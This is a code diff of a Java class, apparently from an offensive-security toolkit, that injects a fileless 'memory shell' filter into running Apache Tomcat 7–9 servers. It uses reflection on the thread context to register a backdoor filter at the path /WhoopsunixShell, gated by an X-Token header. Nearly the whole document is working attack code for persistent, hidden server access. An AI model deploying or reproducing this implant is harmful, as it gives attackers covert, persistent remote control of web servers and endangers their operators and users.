@@ -1,30 +1,25 @@
-package com.demo.memshell;
+package com.demo.memshell.whole.exec;
 
 import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.InputStream;
 import java.io.PrintWriter;
-import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
-import java.util.Properties;
 
 /**
  * @author Whoopsunix
- * Thread 获取上下文注入 Tomcat Filter 型内存马
- * Tomcat 6
- * Ref: https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/
+ * Thread 获取上下文注入 Tomcat Servlet 型内存马
+ * Tomcat 7 8 9
  */
-// todo 改id
-public class Tomcat6FilterThreadMS implements Filter {
-
-    private static String NAME = "TomcatServletThreadMS";
+public class TomcatFilterThreadMS implements Filter {
+    private static String NAME = "Whoopsunix";
     private static String pattern = "/WhoopsunixShell";
     private static String header = "X-Token";
     private static HttpServletRequest request;
     private static HttpServletResponse response;
 
-    public Tomcat6FilterThreadMS() {
+    public TomcatFilterThreadMS() {
 
     }
 
@@ -69,56 +64,67 @@ public class Tomcat6FilterThreadMS implements Filter {
              */
             Object standardContext;
             try {
-                ServletContext servletContext = (ServletContext) request.getClass().getDeclaredMethod("getServletContext").invoke(request);
+                Object servletContext = request.getClass().getDeclaredMethod("getServletContext").invoke(request);
                 Object applicationContext = getFieldValue(servletContext, "context");
                 standardContext = getFieldValue(applicationContext, "context");
             } catch (NoSuchMethodException e) {
                 standardContext = getFieldValue(request, "context");
             }
 
+            addFilter(standardContext);
+
+        } catch (Exception e) {
+        }
+    }
+
+    public static void addFilter(Object standardContext) {
+        try {
+
             Object filterDef = standardContext.getClass().getDeclaredMethod("findFilterDef", String.class).invoke(standardContext, NAME);
 
-            if (filterDef == null) {
-                Tomcat6FilterThreadMS tfmsThread = new Tomcat6FilterThreadMS();
-                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
+            if (filterDef != null) {
+                return;
+            }
+            TomcatFilterThreadMS filterMemShell = new TomcatFilterThreadMS();
+
+            // tomcat 7
+            // org.apache.catalina.deploy.FilterDef
+            // tomcat 8 9
+            // org.apache.tomcat.util.descriptor.web.FilterDef
+            try {
+                // 添加 filterDef
+                try {
+                    filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
+                } catch (ClassNotFoundException e) {
+                    filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
+                }
                 filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, NAME);
-                filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, tfmsThread.getClass().getName());
+                filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, filterMemShell.getClass().getName());
+                filterDef.getClass().getDeclaredMethod("setFilter", Class.forName("javax.servlet.Filter")).invoke(filterDef, filterMemShell);
                 standardContext.getClass().getDeclaredMethod("addFilterDef", filterDef.getClass()).invoke(standardContext, filterDef);
 
-                Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
+                // 添加 filterMap
+                Object filterMap = null;
+                try {
+                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
+                } catch (ClassNotFoundException e) {
+                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
+                }
                 filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, NAME);
                 filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, pattern);
                 filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, "REQUEST");
                 standardContext.getClass().getDeclaredMethod("addFilterMap", filterMap.getClass()).invoke(standardContext, filterMap);
 
-                // 利用已有 Filter
-                Object tmpFilterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
-                tmpFilterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(tmpFilterDef, NAME);
-                tmpFilterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(tmpFilterDef, "org.apache.catalina.ssi.SSIFilter");
-
-                Properties properties = new Properties();
-                properties.put("org.apache.catalina.ssi.SSIFilter", "123");
-
-//                Field restrictedFiltersField = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredField("restrictedFilters");
-//                restrictedFiltersField.setAccessible(true);
-//                restrictedFiltersField.set(null, properties);
-                Object ApplicationFilterConfigClass = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
-                // SerialVersionUID
-                setFieldValue(ApplicationFilterConfigClass, "serialVersionUID", 8434878928390042976L);
-                Field restrictedFiltersField = ApplicationFilterConfigClass.getClass().getDeclaredField("restrictedFilters");
-                restrictedFiltersField.setAccessible(true);
-                restrictedFiltersField.set(null, properties);
-
-                Constructor applicationFilterConfigConstructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(Class.forName("org.apache.catalina.Context"), filterDef.getClass());
-                applicationFilterConfigConstructor.setAccessible(true);
-                Object filterConfig = applicationFilterConfigConstructor.newInstance(standardContext, tmpFilterDef);
-                setFieldValue(filterConfig, "filter", tfmsThread);
-                setFieldValue(filterConfig, "filterDef", filterDef);
-
+                // 添加 filterConfig
                 java.util.Map filterConfigs = (java.util.Map) getFieldValue(standardContext, "filterConfigs");
+                java.lang.reflect.Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(Class.forName("org.apache.catalina.Context"), filterDef.getClass());
+                constructor.setAccessible(true);
+                Object filterConfig = constructor.newInstance(standardContext, filterDef);
                 filterConfigs.put(NAME, filterConfig);
+            } catch (Exception e) {
             }
         } catch (Exception e) {
+
         }
     }
 
@@ -182,12 +188,15 @@ public class Tomcat6FilterThreadMS implements Filter {
         }
     }
 
-    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
-        Field field = getField(obj.getClass(), fieldName);
+    /**
+     * tools
+     */
+    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
         return field.get(obj);
     }
 
-    public static Field getField(Class<?> clazz, String fieldName) {
+    public static Field getField(final Class<?> clazz, final String fieldName) {
         Field field = null;
         try {
             field = clazz.getDeclaredField(fieldName);
@@ -199,8 +208,8 @@ public class Tomcat6FilterThreadMS implements Filter {
         return field;
     }
 
-    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
-        Field field = getField(obj.getClass(), fieldName);
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
         field.set(obj, value);
     }
 }
